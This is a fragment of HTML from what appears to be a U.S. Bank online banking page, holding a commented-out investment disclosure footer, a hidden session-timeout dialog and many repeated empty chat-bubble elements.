			<div style="color:#333333;"><p style="font-size:10px; font-weight:bold; line-height:1; margin:0px 0px 0px">For U.S. Bancorp Investments:</p><p style="font-size:10px; line-height:1.5; margin:10px 0px 0px">Investment products and services are available through U.S. Bancorp Investments, the marketing name for U.S. Bancorp Investments, Inc., member <a style="font-size:10px; text-decoration: underline;" onmouseover="this.style.textDecoration = 'none',this.style.color= '#0c2074'" onmouseout="this.style.textDecoration = 'underline',this.style.color= '#0c2074'" title="FINRA" href="http://www.finra.org/" target="_blank">FINRA</a> and <a style="font-size:10px; text-decoration: underline;" onmouseover="this.style.textDecoration = 'none',this.style.color= '#0c2074'" onmouseout="this.style.textDecoration = 'underline',this.style.color= '#0c2074'" title="SIPC" href="http://www.sipc.org/" target="_blank">SIPC</a>, an investment adviser and a brokerage subsidiary of U.S. Bancorp and affiliate of U.S. Bank.</p><p style="font-size:10px; line-height:2; margin:10px 0px 0px">The Financial Industry Regulatory Authority (FINRA) Rule 2267 provides for BrokerCheck to allow investors to learn about the professional background, business practices, and conduct of FINRA member firms or their brokers. To request such information, contact FINRA toll-free 1.800.289.9999 or via www.finra.org. An investor brochure describing BrokerCheck is also available through FINRA</p></div>
		 
            </div>-->
      </div>
        
    </div>

    <div style="display: none">
        <div id="timeoutTemplate" class="infoDialog" title="">
            <h2>
                Signing out...</h2>
            <div class="vs10">
                <span>
                    Warning! Your Online Banking session will expire soon....</span>
            </div>
            <div class="buttonPanel">
                <span>
                    <input type="button" value="Extend Session" id="btnExtendSession" class="usb-blue-default span-4"></span>
                <span class="padLeft15">
                    <input type="button" value="Log Out" id="btnSignout" class="usb-blue-default Logout"></span>
            </div>
            <div class="vs2">
            <div class="timeoutTemplateExtendedMessage top" style="display: none">
                Your session has been extended.
            </div>
            <div class="clear vs20">
            </div>
        </div>
    </div>

  

</div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div><div class="chat-bubble" id="divHelpBubble" style=""></div></body></html>